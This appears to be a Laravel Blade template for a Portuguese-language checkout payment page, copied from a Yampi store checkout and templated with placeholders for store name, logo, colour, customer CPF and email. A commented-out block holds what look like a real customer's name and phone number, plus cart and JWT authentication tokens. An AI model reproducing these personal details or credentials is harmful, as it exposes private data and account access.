{{--                "medium": "https:\/\/cdn.shopify.com\/s\/files\/1\/0754\/7938\/4369\/products\/1-main-rains-chuva-tortorage-packaging-ag-ag-cereals-oiosture-sect-nsect-roof-telhado-ag-ealed-ag-ag-hichickened-orortable-ood-ood-ice-gelo-ean-ean-tainer-ontainer-oozzle-ag-ag_500x500.png",--}}
{{--                "has_price_discount": true,--}}
{{--                "price_gift": null,--}}
{{--                "price_gift_formated": "R$ 0,00",--}}
{{--                "price_sale": "249.80",--}}
{{--                "price_sale_formated": "R$ 249,80",--}}
{{--                "price": "79.00",--}}
{{--                "price_total": 79,--}}
{{--                "price_formated": "R$ {{str_replace('.',',',$data['preco'])}}",--}}
{{--                "price_total_formated": "R$ {{str_replace('.',',',$data['preco'])}}",--}}
{{--                "name": "Smart Pote (10 Unidades) - M\u00e9todo inovador para armazenagem de alimentos",--}}
{{--                "name_with_grids": "Smart Pote (10 Unidades) - M\u00e9todo inovador para armazenagem de alimentos 500g (10 Unidades)",--}}
{{--                "sku": "reklhssd78",--}}
{{--                "availability_days": -1,--}}
{{--                "availability_text": "-1 dias \u00fateis",--}}
{{--                "categories": [2852133, 2862461, 2862462],--}}
{{--                "categories_names": ["Mais Vendidos", "Casa & Jardim", "Cozinha"],--}}
{{--                "grids": [{"name": "Tamanho", "value": "500g (10 Unidades)"}],--}}
{{--                "is_digital": false,--}}
{{--                "short_description": "Smart Pote (10 Unidades) - M\u00e9todo inovador para armazenagem de alimentos",--}}
{{--                "customizations": [],--}}
{{--                "customized": false,--}}
{{--                "allow_sell_without_customization": 0,--}}
{{--                "selected_customizations": 0,--}}
{{--                "shopify_variant_id": "45300993196337",--}}
{{--                "shopify_product_id": "8450500755761",--}}
{{--                "order_bump_id": null,--}}
{{--                "product_option": {--}}
{{--                    "id": 121671212,--}}
{{--                    "store_id": 586266,--}}
{{--                    "product_id": 17987792,--}}
{{--                    "price_sale": "249.80",--}}
{{--                    "price_discount": "79.00",--}}
{{--                    "sku": "reklhssd78",--}}
{{--                    "quantity_managed": 0,--}}
{{--                    "availability": 1,--}}
{{--                    "availability_soldout": -1,--}}
{{--                    "allow_sell_without_customization": 0,--}}
{{--                    "product": {--}}
{{--                        "id": 17987792,--}}
{{--                        "name": "Smart Pote (10 Unidades) - M\u00e9todo inovador para armazenagem de alimentos",--}}
{{--                        "slug": "smart-pote-10-unidades-metodo-inovador-para-armazenagem-de-alimentos-6461bc08448df",--}}
{{--                        "gift_value": null,--}}
{{--                        "is_digital": 0,--}}
{{--                        "seo_description": null,--}}
{{--                        "brand_id": 10957845,--}}
{{--                        "facebook_pixel_id": null,--}}
{{--                        "custom_shipping": 0,--}}
{{--                        "shipping_price": "0.00",--}}
{{--                        "store_id": 586266,--}}
{{--                        "simple": 0,--}}
{{--                        "brand": {--}}
{{--                            "id": 10957845,--}}
{{--                            "store_id": 586266,--}}
{{--                            "active": 1,--}}
{{--                            "featured": 0,--}}
{{--                            "name": "{{$data['nm_loja']}}",--}}
{{--                            "description": null,--}}
{{--                            "logo": null,--}}
{{--                            "created_at": "2023-04-27 02:11:38",--}}
{{--                            "updated_at": "2023-04-27 02:11:38",--}}
{{--                            "deleted_at": null--}}
{{--                        }--}}
{{--                    },--}}
{{--                    "stocks": []--}}
{{--                },--}}
{{--                "cart": {--}}
{{--                    "id": 351260355,--}}
{{--                    "store_id": 586266,--}}
{{--                    "customer_id": null,--}}
{{--                    "promocode_id": null,--}}
{{--                    "payment_id": null,--}}
{{--                    "address_id": null,--}}
{{--                    "seller_id": null,--}}
{{--                    "done": 0,--}}
{{--                    "token": "shopify-335233c33b52253e2e48f95bcaa3301c",--}}
{{--                    "has_recomm": 0,--}}
{{--                    "value_shipment": null,--}}
{{--                    "zipcode": null,--}}
{{--                    "shipment_service_id": null,--}}
{{--                    "payment_alias": "credit_card",--}}
{{--                    "tracking_data": null,--}}
{{--                    "utm_source": null,--}}
{{--                    "utm_campaign": null,--}}
{{--                    "utm_medium": null,--}}
{{--                    "utm_term": null,--}}
{{--                    "utm_content": null,--}}
{{--                    "created_at": "2023-05-27 17:46:53",--}}
{{--                    "updated_at": "2023-05-27 17:46:53",--}}
{{--                    "deleted_at": null--}}
{{--                },--}}
{{--                "order_bump": []--}}
{{--            }],--}}
{{--            discounts: [{"name": "Cupom de desconto", "value": 0, "accumulate": false}],--}}
{{--            customer: {--}}
{{--                "id": 148572890,--}}
{{--                "first_name": "Wilson",--}}
{{--                "last_name": "Pereira",--}}
{{--                "full_name": "{{$data['nome_completo']}}",--}}
{{--                "email": "{{$data['email']}}",--}}
{{--                "document": "{{$data['cpf']}}",--}}
{{--                "document_type": "CPF",--}}
{{--                "birthday": null,--}}
{{--                "phone_number": "5548996831161"--}}
{{--            },--}}
{{--        };--}}

{{--        window.checkout.firstOrderPromocode = {--}}
{{--            code: 'PRIMEIRACOMPRA',--}}
{{--            min: 0.00--}}
{{--        }--}}

{{--        window.yampi = window.yampi || {};--}}

{{--        window.yampi = Object.assign(window.yampi, {--}}
{{--            external_auth_token: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvc2VndXJvLmxvamFsaWZvcmQuY29tXC9jYXJ0XC9wYXltZW50IiwiaWF0IjoxNjg1MjIxMDI2LCJleHAiOjE2ODUyMjE2MjYsIm5iZiI6MTY4NTIyMTAyNiwianRpIjoidmFrRk0wTUFwQTd0Tk5kTCIsInN1YiI6MzUxMjYwMzU1LCJwcnYiOiI2ZTNiNmEyYmQyYTg3NjNhYWFiOGVhMWMyNDM3NWQxZTlhZGIwNGQ5IiwiY2FydF9pZCI6MzUxMjYwMzU1LCJtZXJjaGFudF9uYW1lIjoiTG9qYSBMaWZvcmQifQ.jVdQQbuDQuOZh3XY2830pU2odDtut2wBH9VnYaWdKW4',--}}
{{--            buyer_endpoint: 'https://buyer.yampi.io/v1/'--}}
{{--        });--}}
{{--    </script>--}}

    <script>
        window.SDKS = {
            "mercadopago": {
                "script": "https:\/\/secure.mlstatic.com\/sdk\/javascript\/v1\/mercadopago.js",
                "param": "public_key",
                "gateway": "mercadopago"
            },
            "pagarme": {
                "script": "\/\/assets.pagar.me\/js\/pagarme.min.js",
                "param": "encryption_key",
                "gateway": "pagarme"
            },
            "moip": {
                "script": "\/\/assets.moip.com.br\/v2\/moip-2.7.1.min.js",
                "param": "public_key",
                "gateway": "moip"
            },
            "iugu": {"script": "https:\/\/js.iugu.com\/v2", "param": "account_id", "gateway": "iugu"},
            "pagseguro": {
                "param": "email",
                "script": "https:\/\/stc.pagseguro.uol.com.br\/pagseguro\/api\/v2\/checkout\/pagseguro.directpayment.js"
            }
        }
    </script>

    <script>
        window.conversionPixels = window.conversionPixels || [];
    </script>

    <script>
        !function (f, b, e, v, n, t, s) {
            if (f.fbq) return;
            n = f.fbq = function () {
                n.callMethod ?
                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
            };
            if (!f._fbq) f._fbq = n;
            n.push = n;
            n.loaded = !0;
            n.version = '2.0';
            n.queue = [];
            t = b.createElement(e);
            t.async = !0;
            t.src = v;
            s = b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t, s)
        }(window, document, 'script',
            'https://connect.facebook.net/en_US/fbevents.js');
    </script>

    <script>
        @php
            if (!empty($data['pixelfb'])) {
                for ($i = 1; $i <= 6; $i++) {
                    if ($data['pixelfb']['pixel_' . $i] != null) {
                        echo "fbq('init', " . $data['pixelfb']['pixel_' . $i] . ");";
                    }
                }
            }
        @endphp
    </script>

    <script>
        window.conversionPixels = window.conversionPixels || [];
    </script>

    <script>
        window.dataLayer = window.dataLayer || [];

        if (window.checkout) {
            window.dataLayer.push(window.checkout.cart);

            if (typeof (window.checkout.cart.items) != 'undefined') {
                var orderSkus = [];

                for (i = 0; i < window.checkout.cart.items.length; i++) {
                    var eventName = 'optimize.sku.' + window.checkout.cart.items[i].sku;
                    window.dataLayer.push({event: eventName});
                    orderSkus.push(window.checkout.cart.items[i].sku);

                    console.log('Datalayer event: ' + eventName);
                }

                window.dataLayer.push({
                    cartSkus: orderSkus.join(',')
                });
            }
        }
    </script>

    <script>
        window.gandalf = {
            active: true,
            url: 'https://seguro.lojaliford.com/cart/recomm',
            env: 'production'
        }
    </script>

    <script>
        (function (h, o, t, j, a, r) {
            h.hj = h.hj || function () {
                (h.hj.q = h.hj.q || []).push(arguments)
            };
            h._hjSettings = {hjid: 3285671, hjsv: 6};
            a = o.getElementsByTagName('head')[0];
            r = o.createElement('script');
            r.async = 1;
            r.src = t + h._hjSettings.hjid + j + h._hjSettings.hjsv;
            a.appendChild(r);
        })(window, document, 'https://static.hotjar.com/c/hotjar-', '.js?sv=');
    </script>

    <script>
        !function(e,a,n,t,s,c){e.ana||((t=e.ana=function(){t.process?t.process.apply(t,arguments):t.queue.push(arguments)}).queue=[],t.t=+new Date,(s=a.createElement(n)).async=1,s.src="https://cdn.yampi.io/ana/ana.min.js?t="+864e5*Math.ceil(new Date/864e5),(c=a.getElementsByTagName(n)[0]).parentNode.insertBefore(s,c))}(window,document,"script");
    </script>
</head>

@php
    $products = collect($data['products']);

    $baseTotalPrice = $products->sum(function ($product) {
        return $product['preco'] * $product['quantidade'];
    });

    $bumpProducts = collect($data['bumpProducts']);
@endphp

<body class="liord2 checkout-payment custom-checkout mercadopago centered-logo">
    <div class="inner-body">
        <header class="clearfix" style="background: {{$data['cor_loja']}};">
            <div class="container clearfix">
                <div class="inner-header -center">
                    <div class="holder-logo pull-left hcenter flex">
                        <a id="header-logo" href="#">
                            <div class="logo">
                                <img src="http://{{$data['img_loja']}}" class="img-logo" alt="loja logo">
                            </div>
                        </a>
                    </div>

                    <div class="flex-holder flex hcenter end">
                        <div class="item-security pull-right black-70">
                            <svg width="89" height="19" viewBox="0 0 89 19" fill="#898792" xmlns="http://www.w3.org/2000/svg">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M9.75 14.1875V8.5C9.75 8.05127 9.38623 7.6875 8.9375 7.6875L2.4375 7.6875C1.98877 7.6875 1.625 8.05127 1.625 8.5L1.625 14.1875C1.625 14.6362 1.98877 15 2.4375 15H8.9375C9.38623 15 9.75 14.6362 9.75 14.1875ZM11.375 8.5V14.1875C11.375 15.5337 10.2837 16.625 8.9375 16.625H2.4375C1.09131 16.625 -5.8844e-08 15.5337 0 14.1875L2.48609e-07 8.5C3.07453e-07 7.15381 1.09131 6.0625 2.4375 6.0625L8.9375 6.0625C10.2837 6.0625 11.375 7.15381 11.375 8.5Z"/>
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M5.6875 3.625C4.79004 3.625 4.0625 4.35254 4.0625 5.25V6.875H2.4375V5.25C2.4375 3.45507 3.89257 2 5.6875 2C7.48243 2 8.9375 3.45507 8.9375 5.25V6.875H7.3125V5.25C7.3125 4.35254 6.58496 3.625 5.6875 3.625Z"/>
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M6.5 10.125L6.5 12.5625H4.875L4.875 10.125H6.5Z"/>
                                <path d="M23.136 0.11C23.73 0.11 24.236 0.205333 24.654 0.396C25.072 0.586667 25.391 0.861666 25.611 1.221C25.831 1.58033 25.941 2.01667 25.941 2.53C25.941 3.04333 25.831 3.47967 25.611 3.839C25.391 4.19833 25.072 4.47333 24.654 4.664C24.236 4.85467 23.73 4.95 23.136 4.95H21.695V7.37H19.803V0.11H23.136ZM22.839 3.531C23.235 3.531 23.532 3.45033 23.73 3.289C23.9353 3.12033 24.038 2.86733 24.038 2.53C24.038 2.19267 23.9353 1.94333 23.73 1.782C23.532 1.61333 23.235 1.529 22.839 1.529H21.695V3.531H22.839Z"/>
                                <path d="M33.0094 7.37H31.0624L30.5564 5.731H28.0704L27.5534 7.37H25.6504L28.2024 0.11H30.4684L33.0094 7.37ZM28.4224 4.444H30.2044L29.3134 1.507L28.4224 4.444Z"/>
                                <path d="M36.5882 7.48C35.9429 7.48 35.3672 7.337 34.8612 7.051C34.3626 6.765 33.9739 6.34333 33.6952 5.786C33.4166 5.22867 33.2772 4.55033 33.2772 3.751C33.2772 2.96633 33.4239 2.29533 33.7172 1.738C34.0106 1.18067 34.4286 0.751667 34.9712 0.451C35.5212 0.150333 36.1666 0 36.9072 0C37.7286 0 38.3922 0.150333 38.8982 0.451C39.4042 0.744333 39.7966 1.21367 40.0752 1.859L38.3262 2.552C38.2309 2.178 38.0622 1.90667 37.8202 1.738C37.5782 1.56933 37.2776 1.485 36.9182 1.485C36.5589 1.485 36.2509 1.573 35.9942 1.749C35.7376 1.91767 35.5432 2.17067 35.4112 2.508C35.2792 2.838 35.2132 3.24867 35.2132 3.74C35.2132 4.25333 35.2792 4.68233 35.4112 5.027C35.5506 5.37167 35.7522 5.62833 36.0162 5.797C36.2876 5.95833 36.6212 6.039 37.0172 6.039C37.2299 6.039 37.4242 6.01333 37.6002 5.962C37.7762 5.91067 37.9302 5.83733 38.0622 5.742C38.1942 5.63933 38.2969 5.51467 38.3702 5.368C38.4436 5.214 38.4802 5.03433 38.4802 4.829V4.719H36.8192V3.454H40.0862V7.37H38.7992L38.6562 5.665L38.9642 5.929C38.8102 6.42767 38.5316 6.81267 38.1282 7.084C37.7322 7.348 37.2189 7.48 36.5882 7.48Z"/>
                                <path d="M48.1344 7.37H46.1874L45.6814 5.731H43.1954L42.6784 7.37H40.7754L43.3274 0.11H45.5934L48.1344 7.37ZM43.5474 4.444H45.3294L44.4384 1.507L43.5474 4.444Z"/>
                                <path d="M57.3828 0.11V7.37H55.7108V4.037L55.7658 1.804H55.7438L53.9508 7.37H52.4218L50.6288 1.804H50.6068L50.6618 4.037V7.37H48.9788V0.11H51.6738L52.8178 3.806L53.2248 5.346H53.2468L53.6648 3.817L54.7978 0.11H57.3828Z"/>
                                <path d="M58.9905 7.37V0.11H64.6445V1.573H60.8825V3.047H63.8745V4.422H60.8825V5.907H64.7875V7.37H58.9905Z"/>
                                <path d="M72.4749 0.11V7.37H70.3739L68.1189 3.443L67.5689 2.365H67.5579L67.6019 3.707V7.37H65.9299V0.11H68.0309L70.2859 4.037L70.8359 5.115H70.8469L70.8029 3.773V0.11H72.4749Z"/>
                                <path d="M80.1883 0.11V1.573H77.8233V7.37H75.9313V1.573H73.5553V0.11H80.1883Z"/>
                                <path d="M84.225 0C84.9583 0 85.589 0.150333 86.117 0.451C86.6523 0.744333 87.063 1.16967 87.349 1.727C87.635 2.28433 87.778 2.95533 87.778 3.74C87.778 4.52467 87.635 5.19567 87.349 5.753C87.063 6.31033 86.6523 6.73933 86.117 7.04C85.589 7.33333 84.9583 7.48 84.225 7.48C83.4917 7.48 82.8573 7.33333 82.322 7.04C81.7867 6.73933 81.376 6.31033 81.09 5.753C80.804 5.19567 80.661 4.52467 80.661 3.74C80.661 2.95533 80.804 2.28433 81.09 1.727C81.376 1.16967 81.7867 0.744333 82.322 0.451C82.8573 0.150333 83.4917 0 84.225 0ZM84.225 1.485C83.873 1.485 83.576 1.56933 83.334 1.738C83.092 1.90667 82.9087 2.15967 82.784 2.497C82.6593 2.827 82.597 3.24133 82.597 3.74C82.597 4.23133 82.6593 4.64567 82.784 4.983C82.9087 5.32033 83.092 5.57333 83.334 5.742C83.576 5.91067 83.873 5.995 84.225 5.995C84.577 5.995 84.8703 5.91067 85.105 5.742C85.347 5.57333 85.5303 5.32033 85.655 4.983C85.7797 4.64567 85.842 4.23133 85.842 3.74C85.842 3.24133 85.7797 2.827 85.655 2.497C85.5303 2.15967 85.347 1.90667 85.105 1.738C84.8703 1.56933 84.577 1.485 84.225 1.485Z"/>
                                <path d="M21.03 18.37V13.84C21.03 13.7067 21.03 13.57 21.03 13.43C21.0367 13.2833 21.0433 13.13 21.05 12.97C20.8233 13.19 20.5633 13.38 20.27 13.54C19.9833 13.6933 19.6867 13.8033 19.38 13.87L19.18 12.94C19.32 12.92 19.4833 12.8733 19.67 12.8C19.8567 12.7267 20.05 12.6333 20.25 12.52C20.45 12.4067 20.6333 12.2867 20.8 12.16C20.9667 12.0267 21.0967 11.8967 21.19 11.77H22.09V18.37H21.03Z"/>
                                <path d="M26.1634 18.47C25.3701 18.47 24.7468 18.1833 24.2934 17.61C23.8468 17.03 23.6234 16.1833 23.6234 15.07C23.6234 13.9567 23.8468 13.1133 24.2934 12.54C24.7468 11.96 25.3701 11.67 26.1634 11.67C26.9634 11.67 27.5868 11.96 28.0334 12.54C28.4868 13.1133 28.7134 13.9567 28.7134 15.07C28.7134 16.1833 28.4868 17.03 28.0334 17.61C27.5868 18.1833 26.9634 18.47 26.1634 18.47ZM26.1634 17.56C26.4834 17.56 26.7501 17.47 26.9634 17.29C27.1834 17.1033 27.3468 16.8267 27.4534 16.46C27.5668 16.0867 27.6234 15.6233 27.6234 15.07C27.6234 14.5167 27.5668 14.0567 27.4534 13.69C27.3468 13.3167 27.1834 13.04 26.9634 12.86C26.7501 12.6733 26.4834 12.58 26.1634 12.58C25.8434 12.58 25.5734 12.6733 25.3534 12.86C25.1401 13.04 24.9801 13.3167 24.8734 13.69C24.7668 14.0567 24.7134 14.5167 24.7134 15.07C24.7134 15.6233 24.7668 16.0867 24.8734 16.46C24.9801 16.8267 25.1401 17.1033 25.3534 17.29C25.5734 17.47 25.8434 17.56 26.1634 17.56Z"/>
                                <path d="M32.4427 18.47C31.6494 18.47 31.0261 18.1833 30.5727 17.61C30.1261 17.03 29.9027 16.1833 29.9027 15.07C29.9027 13.9567 30.1261 13.1133 30.5727 12.54C31.0261 11.96 31.6494 11.67 32.4427 11.67C33.2427 11.67 33.8661 11.96 34.3127 12.54C34.7661 13.1133 34.9927 13.9567 34.9927 15.07C34.9927 16.1833 34.7661 17.03 34.3127 17.61C33.8661 18.1833 33.2427 18.47 32.4427 18.47ZM32.4427 17.56C32.7627 17.56 33.0294 17.47 33.2427 17.29C33.4627 17.1033 33.6261 16.8267 33.7327 16.46C33.8461 16.0867 33.9027 15.6233 33.9027 15.07C33.9027 14.5167 33.8461 14.0567 33.7327 13.69C33.6261 13.3167 33.4627 13.04 33.2427 12.86C33.0294 12.6733 32.7627 12.58 32.4427 12.58C32.1227 12.58 31.8527 12.6733 31.6327 12.86C31.4194 13.04 31.2594 13.3167 31.1527 13.69C31.0461 14.0567 30.9927 14.5167 30.9927 15.07C30.9927 15.6233 31.0461 16.0867 31.1527 16.46C31.2594 16.8267 31.4194 17.1033 31.6327 17.29C31.8527 17.47 32.1227 17.56 32.4427 17.56Z"/>
                                <path d="M37.362 18.37L41.682 11.77H42.602L38.292 18.37H37.362ZM37.622 11.67C37.962 11.67 38.2554 11.7467 38.502 11.9C38.7554 12.0533 38.9487 12.2667 39.082 12.54C39.222 12.8133 39.292 13.1367 39.292 13.51C39.292 13.8767 39.222 14.2 39.082 14.48C38.9487 14.7533 38.7554 14.9667 38.502 15.12C38.2554 15.2733 37.962 15.35 37.622 15.35C37.2887 15.35 36.9954 15.2733 36.742 15.12C36.4887 14.9667 36.292 14.7533 36.152 14.48C36.0187 14.2 35.952 13.8767 35.952 13.51C35.952 13.1367 36.0187 12.8133 36.152 12.54C36.292 12.2667 36.4887 12.0533 36.742 11.9C36.9954 11.7467 37.2887 11.67 37.622 11.67ZM37.622 12.45C37.4554 12.45 37.312 12.4933 37.192 12.58C37.072 12.66 36.982 12.78 36.922 12.94C36.862 13.0933 36.832 13.2833 36.832 13.51C36.832 13.73 36.862 13.92 36.922 14.08C36.982 14.24 37.072 14.36 37.192 14.44C37.312 14.52 37.4554 14.56 37.622 14.56C37.7954 14.56 37.942 14.52 38.062 14.44C38.182 14.36 38.272 14.24 38.332 14.08C38.392 13.92 38.422 13.73 38.422 13.51C38.422 13.2833 38.392 13.0933 38.332 12.94C38.272 12.78 38.182 12.66 38.062 12.58C37.942 12.4933 37.7954 12.45 37.622 12.45ZM42.342 14.79C42.682 14.79 42.9754 14.8667 43.222 15.02C43.4754 15.1733 43.6687 15.39 43.802 15.67C43.942 15.9433 44.012 16.2633 44.012 16.63C44.012 17.0033 43.942 17.3267 43.802 17.6C43.6687 17.8733 43.4754 18.0867 43.222 18.24C42.9754 18.3933 42.682 18.47 42.342 18.47C42.0087 18.47 41.7154 18.3933 41.462 18.24C41.2087 18.0867 41.012 17.8733 40.872 17.6C40.7387 17.3267 40.672 17.0033 40.672 16.63C40.672 16.2633 40.7387 15.9433 40.872 15.67C41.012 15.39 41.2087 15.1733 41.462 15.02C41.7154 14.8667 42.0087 14.79 42.342 14.79ZM42.342 15.58C42.1754 15.58 42.032 15.62 41.912 15.7C41.792 15.78 41.702 15.9 41.642 16.06C41.582 16.2133 41.552 16.4033 41.552 16.63C41.552 16.85 41.582 17.04 41.642 17.2C41.702 17.36 41.792 17.4833 41.912 17.57C42.032 17.65 42.1754 17.69 42.342 17.69C42.5154 17.69 42.662 17.65 42.782 17.57C42.902 17.4833 42.992 17.36 43.052 17.2C43.112 17.04 43.142 16.85 43.142 16.63C43.142 16.41 43.112 16.22 43.052 16.06C42.992 15.9 42.902 15.78 42.782 15.7C42.662 15.62 42.5154 15.58 42.342 15.58Z"/>
                                <path d="M50.8628 11.67C51.4561 11.67 51.9695 11.7833 52.4028 12.01C52.8361 12.23 53.2028 12.5567 53.5028 12.99L52.7828 13.68C52.5295 13.2933 52.2428 13.0167 51.9228 12.85C51.6095 12.6767 51.2361 12.59 50.8028 12.59C50.4828 12.59 50.2195 12.6333 50.0128 12.72C49.8061 12.8067 49.6528 12.9233 49.5528 13.07C49.4595 13.21 49.4128 13.37 49.4128 13.55C49.4128 13.7567 49.4828 13.9367 49.6228 14.09C49.7695 14.2433 50.0395 14.3633 50.4328 14.45L51.7728 14.75C52.4128 14.89 52.8661 15.1033 53.1328 15.39C53.3995 15.6767 53.5328 16.04 53.5328 16.48C53.5328 16.8867 53.4228 17.24 53.2028 17.54C52.9828 17.84 52.6761 18.07 52.2828 18.23C51.8961 18.39 51.4395 18.47 50.9128 18.47C50.4461 18.47 50.0261 18.41 49.6528 18.29C49.2795 18.17 48.9528 18.0067 48.6728 17.8C48.3928 17.5933 48.1628 17.3567 47.9828 17.09L48.7228 16.35C48.8628 16.5833 49.0395 16.7933 49.2528 16.98C49.4661 17.16 49.7128 17.3 49.9928 17.4C50.2795 17.5 50.5961 17.55 50.9428 17.55C51.2495 17.55 51.5128 17.5133 51.7328 17.44C51.9595 17.3667 52.1295 17.26 52.2428 17.12C52.3628 16.9733 52.4228 16.8 52.4228 16.6C52.4228 16.4067 52.3561 16.2367 52.2228 16.09C52.0961 15.9433 51.8561 15.83 51.5028 15.75L50.0528 15.42C49.6528 15.3333 49.3228 15.21 49.0628 15.05C48.8028 14.89 48.6095 14.6967 48.4828 14.47C48.3561 14.2367 48.2928 13.9767 48.2928 13.69C48.2928 13.3167 48.3928 12.98 48.5928 12.68C48.7995 12.3733 49.0961 12.13 49.4828 11.95C49.8695 11.7633 50.3295 11.67 50.8628 11.67Z"/>
                                <path d="M55.0288 18.37V11.77H59.8088V12.69H56.0988V14.59H58.9988V15.49H56.0988V17.45H59.9488V18.37H55.0288Z"/>
                                <path d="M63.9491 18.47C63.3291 18.47 62.7924 18.3333 62.3391 18.06C61.8857 17.7867 61.5324 17.4 61.2791 16.9C61.0257 16.3933 60.8991 15.7833 60.8991 15.07C60.8991 14.37 61.0291 13.7667 61.2891 13.26C61.5557 12.7533 61.9291 12.3633 62.4091 12.09C62.8957 11.81 63.4524 11.67 64.0791 11.67C64.7657 11.67 65.3191 11.7967 65.7391 12.05C66.1657 12.3033 66.5057 12.6967 66.7591 13.23L65.7691 13.7C65.6424 13.3333 65.4324 13.06 65.1391 12.88C64.8524 12.6933 64.5024 12.6 64.0891 12.6C63.6757 12.6 63.3124 12.6967 62.9991 12.89C62.6924 13.0833 62.4524 13.3667 62.2791 13.74C62.1057 14.1067 62.0191 14.55 62.0191 15.07C62.0191 15.5967 62.0957 16.0467 62.2491 16.42C62.4024 16.7867 62.6324 17.0667 62.9391 17.26C63.2524 17.4533 63.6357 17.55 64.0891 17.55C64.3357 17.55 64.5657 17.52 64.7791 17.46C64.9924 17.3933 65.1791 17.3 65.3391 17.18C65.4991 17.0533 65.6224 16.8967 65.7091 16.71C65.8024 16.5167 65.8491 16.29 65.8491 16.03V15.84H63.9291V14.97H66.7991V18.37H65.9991L65.9391 17.04L66.1391 17.14C65.9791 17.56 65.7124 17.8867 65.3391 18.12C64.9724 18.3533 64.5091 18.47 63.9491 18.47Z"/>
                                <path d="M73.7654 11.77V15.84C73.7654 16.7133 73.5354 17.37 73.0754 17.81C72.6154 18.25 71.9454 18.47 71.0654 18.47C70.1987 18.47 69.5321 18.25 69.0654 17.81C68.6054 17.37 68.3754 16.7133 68.3754 15.84V11.77H69.4454V15.71C69.4454 16.33 69.5787 16.79 69.8454 17.09C70.112 17.39 70.5187 17.54 71.0654 17.54C71.6187 17.54 72.0287 17.39 72.2954 17.09C72.5621 16.79 72.6954 16.33 72.6954 15.71V11.77H73.7654Z"/>
                                <path d="M78.2852 11.77C78.9919 11.77 79.5519 11.9467 79.9652 12.3C80.3852 12.6533 80.5952 13.13 80.5952 13.73C80.5952 14.35 80.3852 14.83 79.9652 15.17C79.5519 15.5033 78.9919 15.67 78.2852 15.67L78.1852 15.73H76.6552V18.37H75.5952V11.77H78.2852ZM78.2052 14.84C78.6386 14.84 78.9586 14.7533 79.1652 14.58C79.3786 14.4 79.4852 14.1267 79.4852 13.76C79.4852 13.4 79.3786 13.13 79.1652 12.95C78.9586 12.77 78.6386 12.68 78.2052 12.68H76.6552V14.84H78.2052ZM78.8352 15.06L80.9852 18.37H79.7552L77.9152 15.48L78.8352 15.06Z"/>
                                <path d="M84.9954 11.67C85.6354 11.67 86.1887 11.8067 86.6554 12.08C87.122 12.3533 87.482 12.7433 87.7354 13.25C87.9887 13.7567 88.1154 14.3633 88.1154 15.07C88.1154 15.7767 87.9887 16.3833 87.7354 16.89C87.482 17.3967 87.122 17.7867 86.6554 18.06C86.1887 18.3333 85.6354 18.47 84.9954 18.47C84.3621 18.47 83.812 18.3333 83.3454 18.06C82.8787 17.7867 82.5187 17.3967 82.2654 16.89C82.0121 16.3833 81.8854 15.7767 81.8854 15.07C81.8854 14.3633 82.0121 13.7567 82.2654 13.25C82.5187 12.7433 82.8787 12.3533 83.3454 12.08C83.812 11.8067 84.3621 11.67 84.9954 11.67ZM84.9954 12.6C84.5821 12.6 84.2254 12.6967 83.9254 12.89C83.6321 13.0833 83.4054 13.3633 83.2454 13.73C83.0854 14.0967 83.0054 14.5433 83.0054 15.07C83.0054 15.59 83.0854 16.0367 83.2454 16.41C83.4054 16.7767 83.6321 17.0567 83.9254 17.25C84.2254 17.4433 84.5821 17.54 84.9954 17.54C85.4154 17.54 85.7721 17.4433 86.0654 17.25C86.3654 17.0567 86.5954 16.7767 86.7554 16.41C86.9154 16.0367 86.9954 15.59 86.9954 15.07C86.9954 14.5433 86.9154 14.0967 86.7554 13.73C86.5954 13.3633 86.3654 13.0833 86.0654 12.89C85.7721 12.6967 85.4154 12.6 84.9954 12.6Z"/>
                            </svg>

                        </div>

                        <a
                            href="https://seguro.lojaliford.com/cart"
                            class="item-cart pull-right black-70 ml30 mr10"
                        >
                            <div class="holder-icon">
                                <svg width="32" height="32" viewBox="0 0 32 32" fill="#898792" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M20 25C20 25.5523 19.5523 26 19 26C18.4477 26 18 25.5523 18 25C18 24.4477 18.4477 24 19 24C19.5523 24 20 24.4477 20 25Z"/>
                                    <path d="M14 25C14 25.5523 13.5523 26 13 26C12.4477 26 12 25.5523 12 25C12 24.4477 12.4477 24 13 24C13.5523 24 14 24.4477 14 25Z"/>
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M7.26541 7C8.75836 7 10.0241 8.09779 10.2353 9.57574L11.7446 20.1414C11.815 20.6341 12.2369 21 12.7346 21L22 21V23H12.7346C11.2416 23 9.97588 21.9022 9.76474 20.4243L8.25536 9.85858C8.18498 9.36593 7.76306 9 7.26541 9L6 9L6 7L7.26541 7Z"/>
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M12 9H21.9384C23.8902 9 25.3222 10.8342 24.8489 12.7276L23.8489 16.7276C23.515 18.0631 22.315 19 20.9384 19H11V17H20.9384C21.3973 17 21.7973 16.6877 21.9086 16.2425L22.9086 12.2425C23.0664 11.6114 22.589 11 21.9384 11H12V9Z"/>
                                </svg>


                                <div class="cart-qtd flex all-center">
                                    1
                                </div><!-- /.cart-qtd -->
                            </div><!-- /.holder-icon -->
                        </a>

                    </div>
                </div>

                <nav>
                    <div class="icon-arrow">
                        <i class="fa fa-angle-left"></i>
                    </div>
                </nav>

                <a href="javascript:" class="st-pusher"></a>

            </div>
        </header>

        <div class="content clearfix">
            <div class="holder-countdown" style="background: {{$data['cor_loja']}};">
                <div class="container">
                    <div class="countdown-text">
                        <p><strong>ESTAMOS PREPARANDO SEU PEDIDO!</strong></p><p><strong>APROVEITE NOSSAS OFERTAS</strong></p>
                    </div>

                </div>
            </div>

            <div class="container clearfix">
                <div class="recomm-cart checkout"></div><!-- /.recomm -->
            </div>

            <div class="container container-pjax clearfix">
                <div class="container-promocode active-payment text-center">

                    <div class="holder-cols-checkout">

                        <ul class="steps-checkout mb20 clearfix hide ">
                            <li class="checkout-step disabled">
                                <div class="connect" style="background: {{$data['cor_loja']}};"></div>
                                <div class="holder-icon" style="background: {{$data['cor_loja']}};">1</div>
                                <div class="info">Informações pessoais</div>
                                <a href="javascript:" data-url="" class="link-abs active" data-target=".box-checkout"></a>
                            </li>

                            <li class="checkout-step enabled">
                                <div class="connect" style="background: {{$data['cor_loja']}};"></div>
                                <div class="holder-icon" style="background: {{$data['cor_loja']}};">2</div>
                                <div class="info">Entrega</div>
